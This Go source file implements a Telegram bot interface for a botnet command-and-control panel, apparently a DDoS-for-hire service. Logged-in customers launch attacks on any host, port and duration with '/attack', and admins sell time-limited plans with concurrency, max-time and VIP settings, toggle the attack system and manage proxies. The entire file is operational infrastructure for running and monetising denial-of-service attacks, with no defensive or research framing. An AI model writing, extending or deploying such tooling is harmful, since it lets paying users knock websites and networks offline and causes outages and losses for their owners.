package telegram

import (
	"arismcnc/database"
	"arismcnc/managers"
	"arismcnc/utils"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type TelegramBot struct {
	bot      *tgbotapi.BotAPI
	db       *database.Database
	sessions map[int64]string // chatID -> username (logged in users)
}

func NewTelegramBot(token string, db *database.Database) (*TelegramBot, error) {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return nil, err
	}

	bot.Debug = true // Enable debug mode
	log.Printf("[TELEGRAM] Bot authorized on account %s", bot.Self.UserName)

	return &TelegramBot{
		bot:      bot,
		db:       db,
		sessions: make(map[int64]string),
	}, nil
}

func (tb *TelegramBot) Start() {
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	log.Printf("[TELEGRAM] Starting to listen for updates...")
	updates := tb.bot.GetUpdatesChan(u)

	for update := range updates {
		log.Printf("[TELEGRAM] Received update: %+v", update)
		
		if update.Message == nil {
			log.Printf("[TELEGRAM] Update has no message, skipping")
			continue
		}

		go tb.handleMessage(update.Message)
	}
}

func (tb *TelegramBot) handleMessage(message *tgbotapi.Message) {
	chatID := message.Chat.ID
	text := message.Text

	log.Printf("[TELEGRAM] Received message from %d: %s", chatID, text)

	if !strings.HasPrefix(text, "/") {
		log.Printf("[TELEGRAM] Ignoring non-command message")
		return
	}

	args := strings.Fields(text)
	if len(args) == 0 {
		return
	}
	command := args[0]
	log.Printf("[TELEGRAM] Processing command: %s", command)

	// Check if user is logged in for protected commands
	username, loggedIn := tb.sessions[chatID]

	// Public commands (no login required)
	switch command {
	case "/start":
		log.Printf("[TELEGRAM] Handling /start command for chat %d", chatID)
		tb.sendWelcome(chatID)
		return
	case "/help":
		log.Printf("[TELEGRAM] Handling /help command for chat %d", chatID)
		tb.sendHelp(chatID, loggedIn, username)
		return
	case "/login":
		log.Printf("[TELEGRAM] Handling /login command for chat %d", chatID)
		tb.handleLogin(chatID, args)
		return
	}

	// Protected commands (require login)
	if !loggedIn {
		tb.sendMessage(chatID, "? *Authentication Required*\n\nYou need to login first with your CNC credentials.\n\nUsage: `/login <username> <password>`\n\nExample: `/login admin mypassword123`")
		return
	}

	userInfo := tb.db.GetAccountInfo(username)

	// User commands
	switch command {
	case "/attack":
		tb.handleAttack(chatID, username, userInfo, args)
	case "/status":
		tb.handleStatus(chatID, username)
	case "/logout":
		tb.handleLogout(chatID)
	case "/profile":
		tb.handleProfile(chatID, username, args)
	case "/methods":
		tb.handleMethods(chatID)
	
	// Admin commands
	case "/useradd":
		tb.handleUserAdd(chatID, username, userInfo, args)
	case "/custom":
		tb.handleCustom(chatID, username, userInfo, args)
	case "/ban":
		tb.handleBan(chatID, username, userInfo, args)
	case "/unban":
		tb.handleUnban(chatID, username, userInfo, args)
	case "/users":
		tb.handleUsers(chatID, username, userInfo)
	case "/vipstatus":
		tb.handleVipStatus(chatID, username, userInfo)
	case "/attacks":
		tb.handleAttacksToggle(chatID, username, userInfo, args)
	case "/blacklist":
		tb.handleBlacklist(chatID, username, userInfo, args)
	case "/proxy":
		tb.handleProxy(chatID, username, userInfo, args)
	default:
		tb.sendMessage(chatID, "? Unknown command. Use /help for available commands.")
	}
}

func (tb *TelegramBot) sendMessage(chatID int64, text string) {
	log.Printf("[TELEGRAM] Attempting to send message to %d: %s", chatID, text[:min(50, len(text))])
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	sent, err := tb.bot.Send(msg)
	if err != nil {
		log.Printf("[TELEGRAM] Failed to send message with Markdown: %v", err)
		// Try without markdown if it fails
		msg.ParseMode = ""
		sent, err = tb.bot.Send(msg)
		if err != nil {
			log.Printf("[TELEGRAM] Failed to send message without Markdown: %v", err)
		} else {
			log.Printf("[TELEGRAM] Message sent successfully without Markdown: %+v", sent)
		}
	} else {
		log.Printf("[TELEGRAM] Message sent successfully: %+v", sent)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (tb *TelegramBot) sendWelcome(chatID int64) {
	welcome := "?? *Nevver API Bot*\n\n" +
		"Welcome to the Nevver API management bot!\n\n" +
		"?? *Authentication Required*\n" +
		"You must login with your CNC credentials to use this bot.\n\n" +
		"*User Commands:*\n" +
		"- /login <username> <password> - Login with your CNC account\n" +
		"- /attack <host> <port> <time> <method> - Launch attack (requires login)\n" +
		"- /status - Check your login status\n" +
		"- /logout - Logout from current session\n" +
		"- /profile [username] - Check user profile\n" +
		"- /methods - List available attack methods\n" +
		"- /help - Show this help message\n\n" +
		"*Admin Commands:*\n" +
		"- /useradd <username> <plan_days> - Add new user\n" +
		"- /custom <username> <maxtime> <concurrents> <expire_days> <vip> - Add with custom settings\n" +
		"- /ban <username> - Ban user\n" +
		"- /unban <username> - Unban user\n" +
		"- /users - List all users\n" +
		"- /vipstatus - Check VIP slots status\n" +
		"- /attacks <enable|disable> - Enable/disable attack system\n" +
		"- /blacklist <add|remove|list> [type] [value] - Manage blacklist\n" +
		"- /proxy <create|list|stop|start|delete> [args] - Manage proxies\n\n" +
		"*Example Usage:*\n" +
		"1. `/login admin mypassword123` - Login with your credentials\n" +
		"2. `/attack example.com 80 60 HTTP` - Launch attack\n" +
		"3. `/status` - Check your account status\n" +
		"4. `/logout` - Logout when done\n\n" +
		"?? *Note:* Your account must have API access enabled to use this bot."

	tb.sendMessage(chatID, welcome)
}

func (tb *TelegramBot) sendHelp(chatID int64, loggedIn bool, username string) {
	if !loggedIn {
		tb.sendWelcome(chatID)
		return
	}

	userInfo := tb.db.GetAccountInfo(username)
	isAdmin := userInfo.Admin == 1

	help := "*Available Commands*\n\n" +
		"*User Commands:*\n" +
		"- /attack host port time method - Launch attack\n" +
		"- /status - Check login status\n" +
		"- /logout - Logout\n" +
		"- /profile username - Check profile\n" +
		"- /methods - List methods\n" +
		"- /help - Show help"

	if isAdmin {
		help += "\n\n*Admin Commands:*\n" +
			"- /useradd username plan - Add user\n" +
			"- /custom username maxtime concurrents expire_time vip - Custom user\n" +
			"- /ban username - Ban user\n" +
			"- /unban username - Unban user\n" +
			"- /users - List users\n" +
			"- /vipstatus - VIP status\n" +
			"- /attacks enable|disable - Toggle attacks\n" +
			"- /blacklist - Manage blacklist\n" +
			"- /proxy - Manage proxies"
	}

	tb.sendMessage(chatID, help)
}

func (tb *TelegramBot) handleLogin(chatID int64, args []string) {
	if len(args) < 3 {
		tb.sendMessage(chatID, "? Usage: /login <username> <password>\n\nExample: /login admin mypassword123")
		return
	}

	username := args[1]
	password := args[2]

	log.Printf("[TELEGRAM] Login attempt - Username: %s, ChatID: %d", username, chatID)

	// Check if user exists
	userInfo := tb.db.GetAccountInfo(username)
	if userInfo.Username == "" {
		log.Printf("[TELEGRAM] Login failed - User not found: %s", username)
		tb.sendMessage(chatID, "? Invalid username or password")
		return
	}

	// Verify password (REQUIRED)
	valid, err := tb.db.VerifyPassword(username, password)
	if err != nil || !valid {
		log.Printf("[TELEGRAM] Login failed - Invalid password for user: %s", username)
		tb.sendMessage(chatID, "? Invalid username or password")
		return
	}

	// Check API access
	if userInfo.ApiAccess != 1 {
		log.Printf("[TELEGRAM] Login failed - API access disabled for user: %s", username)
		tb.sendMessage(chatID, "? API access not enabled for this account. Contact an administrator.")
		return
	}

	// Check if account is expired
	if tb.db.IsAccountExpired(username) {
		log.Printf("[TELEGRAM] Login failed - Account expired: %s", username)
		tb.sendMessage(chatID, "? Your account has expired")
		return
	}

	// Check if banned
	if tb.db.IsUserBanned(username) {
		log.Printf("[TELEGRAM] Login failed - User banned: %s", username)
		tb.sendMessage(chatID, "? Your account has been banned")
		return
	}

	// Login successful - create session
	tb.sessions[chatID] = username
	log.Printf("[TELEGRAM] Login successful - User: %s, ChatID: %d", username, chatID)

	expiryTime, _ := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	expiryStr := utils.CalculateExpiryString(expiryTime)

	response := fmt.Sprintf(`? *Login Successful*

?? *Username:* %s
? *Expriry:* %s
? *Concurrents:* %d
?? *Max Time:* %d seconds
?? *Cooldown:* %d seconds
? *VIoP:* %s
?? V*Admin:* %s
? **API Access:* Enabled

You are now logged in! Use /help to see available commands.`, 
		username, 
		expiryStr,
		userInfo.Concurrents,
		userInfo.Maxtime,
		userInfo.Cooldown,
		boolToYesNo(userInfo.Vip == 1),
		boolToYesNo(userInfo.Admin == 1))

	tb.sendMessage(chatID, response)
	
	// Log the login event
	go func() {
		lm, err := managers.NewLogManager("./assets/logs/logs.json")
		if err == nil {
			defer lm.Close()
			lm.Log(fmt.Sprintf("Telegram Bot Login - User: %s, ChatID: %d", username, chatID))
		}
	}()
}

func (tb *TelegramBot) handleLogout(chatID int64) {
	delete(tb.sessions, chatID)
	tb.sendMessage(chatID, "? Logged out successfully")
}

func (tb *TelegramBot) handleStatus(chatID int64, username string) {
	userInfo := tb.db.GetAccountInfo(username)
	
	expiryTime, _ := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	expiryStr := utils.CalculateExpiryString(expiryTime)
	
	ongoingAttacks := tb.db.GetUserOngoingAttacks(username)
	totalAttacks := tb.db.GetUserTotalAttacks(username)

	status := fmt.Sprintf(`?? *Account Status*

?? *Username:* %s
?? *Expiry:* %s
? *Concurrents:* %d/%d
?? *Total Attacks:* %d
?? *Cooldown:* %d seconds
?? *Max Time:* %d seconds
?? *VIP:* %s
??? *Admin:* %s
?? *API Access:* %s`,
		username,
		expiryStr,
		ongoingAttacks,
		userInfo.Concurrents,
		totalAttacks,
		userInfo.Cooldown,
		userInfo.Maxtime,
		boolToYesNo(userInfo.Vip == 1),
		boolToYesNo(userInfo.Admin == 1),
		boolToYesNo(userInfo.ApiAccess == 1))

	tb.sendMessage(chatID, status)
}

func (tb *TelegramBot) handleProfile(chatID int64, username string, args []string) {
	targetUser := username
	if len(args) >= 2 {
		targetUser = args[1]
	}

	userInfo := tb.db.GetAccountInfo(targetUser)
	if userInfo.Username == "" {
		tb.sendMessage(chatID, "? User not found")
		return
	}

	expiryTime, _ := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	expiryStr := utils.CalculateExpiryString(expiryTime)
	
	totalAttacks := tb.db.GetUserTotalAttacks(targetUser)
	ongoingAttacks := tb.db.GetUserOngoingAttacks(targetUser)

	profile := fmt.Sprintf(`?? *User Profile*

*Username:* %s
*Expiry:* %s
*Concurrents:* %d
*Max Time:* %d seconds
*Cooldown:* %d seconds
*Total Attacks:* %d
*Ongoing Attacks:* %d
*VIP:* %s
*Admin:* %s
*Created By:* %s
*Created At:* %s`,
		targetUser,
		expiryStr,
		userInfo.Concurrents,
		userInfo.Maxtime,
		userInfo.Cooldown,
		totalAttacks,
		ongoingAttacks,
		boolToYesNo(userInfo.Vip == 1),
		boolToYesNo(userInfo.Admin == 1),
		userInfo.CreatedBy,
		userInfo.CreatedAt)

	tb.sendMessage(chatID, profile)
}

func (tb *TelegramBot) handleMethods(chatID int64) {
	methods := utils.GetMethodsList()
	
	response := "? *Available Attack Methods*\n\n"
	for i, method := range methods {
		response += fmt.Sprintf("%d. `%s`\n", i+1, method.Method)
	}

	tb.sendMessage(chatID, response)
}

func (tb *TelegramBot) handleAttack(chatID int64, username string, userInfo database.AccountInfo, args []string) {
	if len(args) < 5 {
		tb.sendMessage(chatID, "? Usage: /attack <host> <port> <time> <method>")
		return
	}

	host := args[1]
	port := args[2]
	duration := args[3]
	method := args[4]

	// Validate method
	methods := utils.GetMethodsList()
	validMethod := false
	for _, m := range methods {
		if strings.ToLower(m.Method) == strings.ToLower(method) {
			validMethod = true
			method = m.Method
			break
		}
	}

	if !validMethod {
		tb.sendMessage(chatID, "? Invalid method. Use /methods to see available methods")
		return
	}

	// Check if account is expired
	if tb.db.IsAccountExpired(username) {
		tb.sendMessage(chatID, "? Your account has expired")
		return
	}

	// Check concurrent attacks
	currentAttacks := tb.db.GetUserCurrentAttacksCount(username)
	if currentAttacks >= userInfo.Concurrents {
		tb.sendMessage(chatID, fmt.Sprintf("? Concurrent limit reached (%d/%d)", currentAttacks, userInfo.Concurrents))
		return
	}

	// Check cooldown
	if userInfo.Admin != 1 {
		cooldown := tb.db.HowLongOnCooldown(username, userInfo.Cooldown)
		if cooldown > 0 {
			tb.sendMessage(chatID, fmt.Sprintf("? Cooldown active. Wait %d seconds", cooldown))
			return
		}
	}

	// Parse duration
	durationInt, err := strconv.Atoi(duration)
	if err != nil || durationInt <= 0 {
		tb.sendMessage(chatID, "? Invalid duration")
		return
	}

	// Check max time
	if durationInt > userInfo.Maxtime && userInfo.Admin != 1 {
		tb.sendMessage(chatID, fmt.Sprintf("? Duration exceeds max time (%d seconds)", userInfo.Maxtime))
		return
	}

	// Create attack
	attackArgs := []string{method, host, port, duration}
	vip := userInfo.Vip == 1
	private := userInfo.Private == 1
	admin := userInfo.Admin == 1

	atk, err := managers.NewAttackTelegram(username, attackArgs, vip, private, admin, userInfo.Maxtime, tb.db)
	if err != nil {
		tb.sendMessage(chatID, fmt.Sprintf("? %s", err.Error()))
		return
	}

	isError, errMsg, msg := atk.BuildTelegram(tb.db)
	if isError {
		tb.sendMessage(chatID, fmt.Sprintf("? %s", errMsg.Error()))
		return
	}

	tb.db.LogAttack(username, host, port, durationInt, method)

	response := fmt.Sprintf(`? *Attack Launched Successfully*

?? *Target:* %s
?? *Port:* %s
?? *Duration:* %s seconds
? *Method:* %s
?? *User:* %s

%s`, host, port, duration, method, username, msg)

	tb.sendMessage(chatID, response)
}

// Admin commands
func (tb *TelegramBot) handleUserAdd(chatID int64, username string, userInfo database.AccountInfo, args []string) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	if len(args) < 3 {
		tb.sendMessage(chatID, "? Usage: /useradd <username> <plan_days>")
		return
	}

	newUsername := args[1]
	planDays, err := strconv.Atoi(args[2])
	if err != nil {
		tb.sendMessage(chatID, "? Invalid plan days")
		return
	}

	// Check if user exists
	exists, _ := tb.db.UserExists(newUsername)
	if exists {
		tb.sendMessage(chatID, "? User already exists")
		return
	}

	// Generate random password
	password, _ := database.GenerateRandomPassword(12)

	newUser := database.User2{
		Username:             newUsername,
		Password:             password,
		Concurrents:          1,
		MaxTime:              60,
		PlanLengthDays:       planDays,
		APIAccess:            1,
		VIP:                  0,
		Cooldown:             60,
		Admin:                0,
		BypassPowerSaving:    0,
		BypassSpamProtection: 0,
		BypassBlacklist:      0,
		CreatedBy:            username,
	}

	err = tb.db.AddUser(newUser)
	if err != nil {
		tb.sendMessage(chatID, fmt.Sprintf("? Failed to add user: %s", err.Error()))
		return
	}

	response := fmt.Sprintf(`? *User Created Successfully*

?? *Username:* %s
?? *Password:* %s
?? *Plan:* %d days
? *Concurrents:* 1
?? *Max Time:* 60 seconds
?? *Cooldown:* 60 seconds`,
		newUsername, password, planDays)

	tb.sendMessage(chatID, response)
}

func (tb *TelegramBot) handleCustom(chatID int64, username string, userInfo database.AccountInfo, args []string) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	if len(args) < 6 {
		tb.sendMessage(chatID, "? Usage: /custom <username> <maxtime> <concurrents> <expire_days> <vip>")
		return
	}

	newUsername := args[1]
	maxtime, _ := strconv.Atoi(args[2])
	concurrents, _ := strconv.Atoi(args[3])
	expireDays, _ := strconv.Atoi(args[4])
	vip, _ := strconv.Atoi(args[5])

	// Check if user exists
	exists, _ := tb.db.UserExists(newUsername)
	if exists {
		tb.sendMessage(chatID, "? User already exists")
		return
	}

	password, _ := database.GenerateRandomPassword(12)

	newUser := database.User2{
		Username:             newUsername,
		Password:             password,
		Concurrents:          concurrents,
		MaxTime:              maxtime,
		PlanLengthDays:       expireDays,
		APIAccess:            1,
		VIP:                  vip,
		Cooldown:             30,
		Admin:                0,
		BypassPowerSaving:    0,
		BypassSpamProtection: 0,
		BypassBlacklist:      0,
		CreatedBy:            username,
	}

	err := tb.db.AddUser(newUser)
	if err != nil {
		tb.sendMessage(chatID, fmt.Sprintf("? Failed to add user: %s", err.Error()))
		return
	}

	response := fmt.Sprintf(`? *Custom User Created*

?? *Username:* %s
?? *Password:* %s
?? *Plan:* %d days
? *Concurrents:* %d
?? *Max Time:* %d seconds
?? *VIP:* %s`,
		newUsername, password, expireDays, concurrents, maxtime, boolToYesNo(vip == 1))

	tb.sendMessage(chatID, response)
}

func (tb *TelegramBot) handleBan(chatID int64, username string, userInfo database.AccountInfo, args []string) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	if len(args) < 2 {
		tb.sendMessage(chatID, "? Usage: /ban <username>")
		return
	}

	targetUser := args[1]

	exists, _ := tb.db.UserExists(targetUser)
	if !exists {
		tb.sendMessage(chatID, "? User not found")
		return
	}

	err := tb.db.ChangeOption(targetUser, "banned", "1")
	if err != nil {
		tb.sendMessage(chatID, fmt.Sprintf("? Failed to ban user: %s", err.Error()))
		return
	}

	tb.sendMessage(chatID, fmt.Sprintf("? User *%s* has been banned", targetUser))
}

func (tb *TelegramBot) handleUnban(chatID int64, username string, userInfo database.AccountInfo, args []string) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	if len(args) < 2 {
		tb.sendMessage(chatID, "? Usage: /unban <username>")
		return
	}

	targetUser := args[1]

	exists, _ := tb.db.UserExists(targetUser)
	if !exists {
		tb.sendMessage(chatID, "? User not found")
		return
	}

	err := tb.db.ChangeOption(targetUser, "banned", "0")
	if err != nil {
		tb.sendMessage(chatID, fmt.Sprintf("? Failed to unban user: %s", err.Error()))
		return
	}

	tb.sendMessage(chatID, fmt.Sprintf("? User *%s* has been unbanned", targetUser))
}

func (tb *TelegramBot) handleUsers(chatID int64, username string, userInfo database.AccountInfo) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	users, err := tb.db.GetAllUsers()
	if err != nil {
		tb.sendMessage(chatID, "? Failed to fetch users")
		return
	}

	totalUsers := len(users)
	activeUsers := 0
	expiredUsers := 0

	for _, user := range users {
		expiryTime, _ := time.Parse("2006-01-02 15:04:05", user.Expiry)
		if time.Now().Before(expiryTime) {
			activeUsers++
		} else {
			expiredUsers++
		}
	}

	response := fmt.Sprintf(`?? *User Statistics*

?? *Total Users:* %d
? *Active Users:* %d
? *Expired Users:* %d

*Recent Users:*
`, totalUsers, activeUsers, expiredUsers)

	// Show last 10 users
	count := 0
	for i := len(users) - 1; i >= 0 && count < 10; i-- {
		user := users[i]
		expiryTime, _ := time.Parse("2006-01-02 15:04:05", user.Expiry)
		status := "?"
		if time.Now().After(expiryTime) {
			status = "?"
		}
		response += fmt.Sprintf("%s %s - Expires: %s\n", status, user.Username, user.Expiry[:10])
		count++
	}

	tb.sendMessage(chatID, response)
}

func (tb *TelegramBot) handleVipStatus(chatID int64, username string, userInfo database.AccountInfo) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	users, _ := tb.db.GetAllUsers()
	vipCount := 0
	adminCount := 0

	for _, user := range users {
		if user.Vip == 1 {
			vipCount++
		}
		if user.Admin == 1 {
			adminCount++
		}
	}

	config, _ := utils.LoadConfig("assets/config.json")
	currentAttacks := tb.db.GetCurrentAttacksLength()

	response := fmt.Sprintf(`?? *VIP Status*

*VIP Users:* %d
*Admin Users:* %d
*Global Slots:* %d/%d
*Attacks Enabled:* %s`,
		vipCount,
		adminCount,
		currentAttacks,
		config.Global_slots,
		boolToYesNo(config.IsAttacksEnabled()))

	tb.sendMessage(chatID, response)
}

func (tb *TelegramBot) handleAttacksToggle(chatID int64, username string, userInfo database.AccountInfo, args []string) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	if len(args) < 2 {
		tb.sendMessage(chatID, "? Usage: /attacks <enable|disable>")
		return
	}

	action := strings.ToLower(args[1])
	
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		tb.sendMessage(chatID, "? Failed to load config")
		return
	}

	if action == "enable" {
		config.Attacks_enabled = true
		tb.sendMessage(chatID, "? Attack system *enabled*")
	} else if action == "disable" {
		config.Attacks_enabled = false
		tb.sendMessage(chatID, "? Attack system *disabled*")
	} else {
		tb.sendMessage(chatID, "? Invalid action. Use enable or disable")
		return
	}

	// Save config (you'll need to implement this)
	tb.sendMessage(chatID, "?? Config updated in memory. Restart required for persistence.")
}

func (tb *TelegramBot) handleBlacklist(chatID int64, username string, userInfo database.AccountInfo, args []string) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	if len(args) < 2 {
		tb.sendMessage(chatID, "? Usage: /blacklist <add|remove|list> [type] [value]")
		return
	}

	action := strings.ToLower(args[1])

	if action == "list" {
		blacklist := utils.ReadBlacklist("assets/blacklists/list.json")
		
		response := "?? *Blacklist*\n\n"
		response += fmt.Sprintf("*IPs:* %d entries\n", len(blacklist.IPs))
		response += fmt.Sprintf("*ASNs:* %d entries\n", len(blacklist.ASNs))

		tb.sendMessage(chatID, response)
		return
	}

	if len(args) < 4 {
		tb.sendMessage(chatID, "? Usage: /blacklist <add|remove> <type> <value>")
		return
	}

	entryType := strings.ToLower(args[2])
	value := args[3]

	tb.sendMessage(chatID, fmt.Sprintf("?? Blacklist management for %s: %s (not fully implemented)", entryType, value))
}

func (tb *TelegramBot) handleProxy(chatID int64, username string, userInfo database.AccountInfo, args []string) {
	if userInfo.Admin != 1 {
		tb.sendMessage(chatID, "? Admin access required")
		return
	}

	if len(args) < 2 {
		tb.sendMessage(chatID, "? Usage: /proxy <create|list|stop|start|delete> [args]")
		return
	}

	action := strings.ToLower(args[1])

	switch action {
	case "list":
		tb.sendMessage(chatID, "?? *Configured Proxies*\n\nNo proxies configured")
	case "create":
		if len(args) < 6 {
			tb.sendMessage(chatID, "? Usage: /proxy create <proxy_host> <proxy_port> <target_host> <target_port>")
			return
		}
		tb.sendMessage(chatID, "?? Proxy creation not fully implemented")
	default:
		tb.sendMessage(chatID, "? Invalid proxy action")
	}
}

func boolToYesNo(b bool) string {
	if b {
		return "Yes"
	}
	return "No"
}
